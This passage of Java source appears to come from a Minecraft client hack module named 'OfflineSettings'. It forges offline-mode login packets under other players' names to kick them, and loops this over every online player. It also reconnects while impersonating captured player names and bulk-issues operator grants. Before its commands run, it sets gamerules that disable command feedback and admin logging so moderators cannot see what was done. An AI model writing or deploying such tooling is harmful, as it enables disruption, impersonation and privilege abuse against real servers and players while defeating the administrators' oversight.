				runLogoutProbe(host, port, username);
			}finally
			{
				logoutProbeRunning.set(false);
			}
		}, "OfflineSettings-LogoutProbe");
		thread.setDaemon(true);
		thread.start();
		return true;
	}
	
	private byte[] readProbePacket(DataInputStream input,
		int compressionThreshold) throws IOException, DataFormatException
	{
		int length = readVarInt(input);
		if(length <= 0)
			return null;
		byte[] data = new byte[length];
		input.readFully(data);
		if(compressionThreshold < 0)
			return data;
		ByteArrayInputStream packetStream = new ByteArrayInputStream(data);
		int dataLength = readVarInt(packetStream);
		if(dataLength == 0)
			return packetStream.readAllBytes();
		byte[] compressed = packetStream.readAllBytes();
		Inflater inflater = new Inflater();
		inflater.setInput(compressed);
		byte[] buffer = new byte[dataLength];
		int read = inflater.inflate(buffer);
		inflater.end();
		if(read < dataLength)
			return Arrays.copyOf(buffer, read);
		return buffer;
	}
	
	private byte[] buildHandshakePayload(String host, int port)
	{
		ByteArrayOutputStream payload = new ByteArrayOutputStream();
		payload.writeBytes(encodeVarInt(
			SharedConstants.getCurrentVersion().protocolVersion()));
		writeString(payload, host);
		payload.write((port >> 8) & 0xFF);
		payload.write(port & 0xFF);
		payload.writeBytes(encodeVarInt(2));
		return payload.toByteArray();
	}
	
	private byte[] buildLoginPayload(String username)
	{
		ByteArrayOutputStream payload = new ByteArrayOutputStream();
		writeString(payload, username);
		UUID uuid = UUID.nameUUIDFromBytes(
			("OfflinePlayer:" + username).getBytes(StandardCharsets.UTF_8));
		ByteBuffer buffer = ByteBuffer.allocate(16);
		buffer.putLong(uuid.getMostSignificantBits());
		buffer.putLong(uuid.getLeastSignificantBits());
		payload.writeBytes(buffer.array());
		return payload.toByteArray();
	}
	
	private void sendProbePacket(OutputStream output, int packetId,
		byte[] payload) throws IOException
	{
		ByteArrayOutputStream packet = new ByteArrayOutputStream();
		packet.writeBytes(encodeVarInt(packetId));
		packet.writeBytes(payload);
		byte[] body = packet.toByteArray();
		output.write(encodeVarInt(body.length));
		output.write(body);
		output.flush();
	}
	
	private static byte[] encodeVarInt(int value)
	{
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		int v = value;
		do
		{
			int temp = v & 0x7F;
			v >>>= 7;
			if(v != 0)
				temp |= 0x80;
			out.write(temp);
		}while(v != 0);
		return out.toByteArray();
	}
	
	private static int readVarInt(InputStream in) throws IOException
	{
		int numRead = 0;
		int result = 0;
		int read;
		do
		{
			read = in.read();
			if(read == -1)
				throw new IOException("Unexpected end of stream");
			int value = read & 0x7F;
			result |= value << (7 * numRead);
			numRead++;
			if(numRead > 5)
				throw new IOException("VarInt is too large");
		}while((read & 0x80) != 0);
		return result;
	}
	
	private static void writeString(ByteArrayOutputStream out, String value)
	{
		byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
		out.writeBytes(encodeVarInt(bytes.length));
		out.writeBytes(bytes);
	}
	
	private static String readString(ByteArrayInputStream in)
	{
		try
		{
			int length = readVarInt(in);
			if(length <= 0)
				return "";
			byte[] bytes = in.readNBytes(length);
			return new String(bytes, StandardCharsets.UTF_8);
		}catch(IOException e)
		{
			return "(invalid disconnect message)";
		}
	}
	
	private void sendLogoutMessage(String text)
	{
		Minecraft client = Minecraft.getInstance();
		Runnable task = () -> ChatUtils.message("[OfflineSettings] " + text);
		if(client != null)
			client.execute(task);
		else
			task.run();
	}
	
	private void sendLogoutError(String text)
	{
		Minecraft client = Minecraft.getInstance();
		Runnable task = () -> ChatUtils.error("OfflineSettings: " + text);
		if(client != null)
			client.execute(task);
		else
			task.run();
	}
	
	// ==================== AUTO LOGOUT ALL ====================
	
	private void clearAutoLogoutAllState()
	{
		autoLogoutAllCurrentTarget = null;
		autoLogoutAllLastAttempt = 0;
		autoLogoutAllWaitingForLeave = false;
		autoLogoutAllProcessed.clear();
	}
	
	private void tickAutoLogoutAll()
	{
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.player == null
			|| client.player.connection == null)
			return;
		
		Set<String> players = new LinkedHashSet<>();
		String self =
			client.getUser() != null ? client.getUser().getName() : "";
		
		for(PlayerInfo entry : client.player.connection.getOnlinePlayers())
		{
			String name =
				StringUtil.stripColor(extractProfileName(entry.getProfile()));
			if(name.isEmpty() || name.equalsIgnoreCase(self))
				continue;
			players.add(name);
		}
		
		if(players.isEmpty())
		{
			clearAutoLogoutAllState();
			return;
		}
		
		// Check if waiting for current target to leave
		if(autoLogoutAllWaitingForLeave)
		{
			String target = autoLogoutAllCurrentTarget;
			if(target != null && !containsIgnoreCase(players, target))
			{
				// Target left, mark as processed
				autoLogoutAllProcessed.add(target);
				autoLogoutAllWaitingForLeave = false;
				autoLogoutAllCurrentTarget = null;
			}else if(target != null)
				return; // Still waiting for target to leave
		}
		
		// If all current players have been processed, restart cycle
		if(autoLogoutAllProcessed.containsAll(players))
		{
			sendLogoutMessage("Auto logout all: all players processed. "
				+ "Restarting the cycle.");
			autoLogoutAllProcessed.clear();
		}
		
		// Pick next unprocessed player
		String nextTarget = null;
		for(String player : players)
		{
			if(!autoLogoutAllProcessed.contains(player))
			{
				nextTarget = player;
				break;
			}
		}
		
		if(nextTarget == null)
			return;
		
		autoLogoutAllCurrentTarget = nextTarget;
		
		long now = System.currentTimeMillis();
		if(autoLogoutAllLastAttempt > 0
			&& now - autoLogoutAllLastAttempt < AUTO_LOGOUT_COOLDOWN_MS)
			return;
		
		ServerData server = getCurrentOrLastServer();
		if(triggerLogoutProbe(nextTarget, server, true, true))
		{
			autoLogoutAllLastAttempt = now;
			autoLogoutAllWaitingForLeave = true;
		}
	}
	
	// ==================== CHECK OP ON JOIN ====================
	
	private void tickCheckOp()
	{
		if(checkOpTicks-- > 0)
			return;
		
		checkOpPending = false;
		
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.getConnection() == null)
			return;
		
		// Check OP by looking at command suggestions
		ClientPacketListener connection = client.getConnection();
		com.mojang.brigadier.CommandDispatcher<?> dispatcher =
			connection.getCommands();
		
		boolean hasOp = false;
		
		if(dispatcher != null)
		{
			for(com.mojang.brigadier.tree.CommandNode<?> node : dispatcher
				.getRoot().getChildren())
			{
				if("op".equalsIgnoreCase(node.getName()))
					hasOp = true;
			}
		}
		
		if(hasOp)
			sendLogoutMessage(
				"\u00a7aYou ARE OP on this server! (/op command available)");
		else
			sendLogoutMessage("\u00a7cYou are NOT op on this server.");
		
		// Run the specified check command if provided
		String opCheckCmd = checkOpCommand.getValue().trim();
		if(!opCheckCmd.isEmpty())
		{
			if(opCheckCmd.startsWith("/"))
				client.getConnection().sendCommand(opCheckCmd.substring(1));
			else
				client.getConnection().sendCommand(opCheckCmd);
			
			sendLogoutMessage("Ran OP check command: " + opCheckCmd);
		}
	}
	
	// ==================== RECONNECT AS RANDOM PLAYER ====================
	
	private void reconnectAsRandomPlayer()
	{
		List<String> players = getCapturedPlayerNames();
		if(players.isEmpty())
		{
			sendLogoutError("No captured player names. Join a server first.");
			return;
		}
		
		// Filter out already-used players
		List<String> available = new ArrayList<>(players);
		available.removeAll(usedRandomReconnectPlayers);
		
		// If all used, reset
		if(available.isEmpty())
		{
			usedRandomReconnectPlayers.clear();
			available.addAll(players);
		}
		
		// Pick random
		String chosen = available.get(random.nextInt(available.size()));
		usedRandomReconnectPlayers.add(chosen);
		
		sendLogoutMessage("Reconnecting as random player: " + chosen + " ("
			+ (available.size() - 1) + " remaining)");
		
		applyName(chosen);
		
		ServerData lastServer = LastServerRememberer.getLastServer();
		Minecraft client = Minecraft.getInstance();
		if(lastServer == null || client == null)
			return;
		
		startConnection(client, null, lastServer);
	}
	
	// ==================== BULK OP ====================
	
	public void startBulkOp(String prefix, int count)
	{
		if(!isEnabled())
		{
			sendLogoutError("OfflineSettings must be enabled.");
			return;
		}
		
		if(bulkOpRunning)
		{
			sendLogoutError("A bulk OP is already running.");
			return;
		}
		
		bulkOpNamePrefix = prefix;
		bulkOpTotal = count;
		bulkOpIndex = 1;
		bulkOpRunning = true;
		
		sendLogoutMessage(
			"Starting bulk OP: " + prefix + "1 to " + prefix + count);
		
		// Send gamerule suppression first
		sendOpGamerules();
	}
	
	private void runBulkOpFromSettings()
	{
		String prefix = bulkOpPrefix.getValue().trim();
		if(prefix.isEmpty())
		{
			sendLogoutError("Bulk OP prefix cannot be empty.");
			return;
		}
		
		int count = bulkOpCount.getValueI();
		startBulkOp(prefix, count);
	}
	
	private void tickBulkOp()
	{
		if(!bulkOpRunning)
			return;
		
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.getConnection() == null)
			return;
		
		// Send up to 20 commands per tick to be fast but not too fast
		int sentThisTick = 0;
		while(bulkOpIndex <= bulkOpTotal && sentThisTick < 20)
		{
			String name = bulkOpNamePrefix + bulkOpIndex;
			client.getConnection().sendCommand("op " + name);
			bulkOpIndex++;
			sentThisTick++;
		}
		
		if(bulkOpIndex > bulkOpTotal)
		{
			bulkOpRunning = false;
			sendLogoutMessage("Bulk OP complete: " + bulkOpNamePrefix + "1 to "
				+ bulkOpNamePrefix + bulkOpTotal);
		}
	}
	
	// ==================== OP COMMANDS & GAMERULE SUPPRESSION
	// ====================
	
	private void sendOpGamerules()
	{
		if(!disableCommandFeedback.isChecked())
			sendOpGameruleCommandFeedback();
		if(!disableAdminLogs.isChecked())
			sendOpGameruleAdminLogs();
	}
	
	private void sendOpGameruleCommandFeedback()
	{
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.getConnection() == null)
			return;
		
		if(isVersionLessThan(1, 21, 1))
			client.getConnection()
				.sendCommand("gamerule sendCommandFeedback false");
		else
			client.getConnection()
				.sendCommand("gamerule send_command_feedback false");
		
		sendLogoutMessage("Disabled command feedback.");
	}
	
	private void sendOpGameruleAdminLogs()
	{
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.getConnection() == null)
			return;
		
		if(isVersionLessThan(1, 21, 1))
			client.getConnection()
				.sendCommand("gamerule logAdminCommands false");
		else
			client.getConnection()
				.sendCommand("gamerule log_admin_commands false");
		
		sendLogoutMessage("Disabled admin logs.");
	}
	
	private void runOpCommand(String command)
	{
		if(!isEnabled())
		{
			sendLogoutError("OfflineSettings must be enabled.");
			return;
		}
		
		Minecraft client = Minecraft.getInstance();
		if(client == null || client.getConnection() == null)
		{
			sendLogoutError("Not connected to a server.");
			return;
		}
		
		// Send gamerule suppression first
		sendOpGamerules();
		
		if(command.startsWith("/"))
			client.getConnection().sendCommand(command.substring(1));
		else
			client.getConnection().sendCommand(command);
		
		sendLogoutMessage("Ran OP command: " + command);
	}
	
	private static boolean isVersionLessThan(int major, int minor, int patch)
	{
		try
		{
			int protocol =
				SharedConstants.getCurrentVersion().protocolVersion();
			return protocol < 768;
		}catch(Throwable t)
		{
			return false;
		}
	}
}
